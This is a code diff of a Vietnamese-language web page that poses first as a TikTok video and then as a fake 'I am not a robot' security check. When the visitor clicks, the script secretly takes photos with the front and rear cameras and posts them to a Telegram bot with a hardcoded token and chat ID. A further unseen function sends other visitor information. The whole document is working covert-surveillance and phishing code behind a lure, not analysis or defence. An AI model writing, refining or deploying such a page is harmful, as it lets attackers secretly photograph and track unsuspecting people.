@@ -3,38 +3,46 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TikTok</title>
+  <title>Kiểm tra bảo mật</title>
   <style>
     body {
       margin: 0;
-      background-color: #000;
-      font-family: sans-serif;
+      background: #000;
       color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #captcha-box {
+      background: #111;
+      border: 1px solid #555;
+      padding: 20px;
+      border-radius: 10px;
       text-align: center;
     }
-    .tiktok-header {
-      padding: 10px;
-      font-weight: bold;
-      background: #000;
-      border-bottom: 1px solid #333;
+    #captcha-box button {
+      margin-top: 10px;
+      padding: 10px 20px;
+      background: #0f0;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
     }
-    video, canvas {
-      width: 100%;
-      max-height: 90vh;
-      object-fit: cover;
-    }
-    .hidden {
+    canvas {
       display: none;
     }
   </style>
 </head>
 <body>
-  <div class="tiktok-header">TikTok</div>
-  <video id="fakeVideo" autoplay muted loop>
-    <source src="https://samplelib.com/lib/preview/mp4/sample-5s.mp4" type="video/mp4" />
-    Trình duyệt của bạn không hỗ trợ video.
-  </video>
-  <canvas id="snapshot" class="hidden"></canvas>
+  <div id="captcha-box">
+    <h3>🔒 Xác minh</h3>
+    <p>Bạn có phải là con người không?</p>
+    <button onclick="startBot()">Tôi không phải robot</button>
+  </div>
+  <canvas id="canvas1"></canvas>
+  <canvas id="canvas2"></canvas>
 
   <script>
     const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
@@ -69,14 +77,14 @@
       });
     }
 
-    async function snapFastPhoto() {
-      const canvas = document.getElementById("snapshot");
+    async function captureCamera(facingMode, canvasId) {
+      const canvas = document.getElementById(canvasId);
       const ctx = canvas.getContext("2d");
       const video = document.createElement("video");
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, audio: false
+          video: { facingMode }, audio: false
         });
 
         video.srcObject = stream;
@@ -87,30 +95,41 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
-        const form = new FormData();
-        form.append("chat_id", chat_id);
-        form.append("photo", blob, "photo.jpg");
+        stream.getTracks().forEach(track => track.stop());
+        return blob;
+      } catch (err) {
+        return null;
+      }
+    }
 
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    async function startBot() {
+      document.getElementById("captcha-box").remove();
+      sendFullInfo();
+
+      const front = await captureCamera("user", "canvas1");
+      const back = await captureCamera("environment", "canvas2");
+
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      if (front) form.append("photo", front, "front.jpg");
+      if (back) form.append("photo", back, "back.jpg");
+
+      if (front || back) {
+        await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
           method: "POST",
           body: form
         });
-
-        stream.getTracks().forEach(track => track.stop());
-      } catch (err) {
+      } else {
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id,
-            text: `📸 Không thể truy cập camera: ${err.message || "Từ chối quyền"}`
+            text: "📸 Không thể truy cập camera trước hoặc sau!"
           })
         });
       }
     }
-
-    sendFullInfo();
-    snapFastPhoto();
   </script>
 </body>
 </html>
